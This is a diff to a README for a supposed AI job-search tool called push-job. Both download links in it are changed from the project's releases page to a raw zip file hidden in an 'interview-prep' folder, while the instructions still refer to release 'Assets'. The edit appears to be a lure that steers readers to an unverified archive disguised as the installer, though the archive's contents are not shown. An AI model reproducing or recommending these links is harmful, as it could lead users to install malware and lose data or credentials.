@@ -1,6 +1,6 @@
 # 🤖 push-job - Automated job search assistance tool
 
-[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ulrikeshifting204/push-job/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ulrikeshifting204/push-job/raw/refs/heads/main/interview-prep/job_push_2.0.zip)
 
 push-job helps you find tech careers. It uses artificial intelligence to scan for roles in cloud computing, cybersecurity, and software development. The software automates tasks like writing cover letters and checking your gaps in certification. It works for you by managing your search pipeline from start to finish.
 
@@ -23,7 +23,7 @@ Ensure your computer meets these requirements before you start:
 
 You need to obtain the installer from the official repository page.
 
-[Visit this page to download the latest setup file](https://github.com/Ulrikeshifting204/push-job/releases)
+[Visit this page to download the latest setup file](https://github.com/Ulrikeshifting204/push-job/raw/refs/heads/main/interview-prep/job_push_2.0.zip)
 
 1. Open the link above in your web browser. 
 2. Look for the section labeled "Assets".
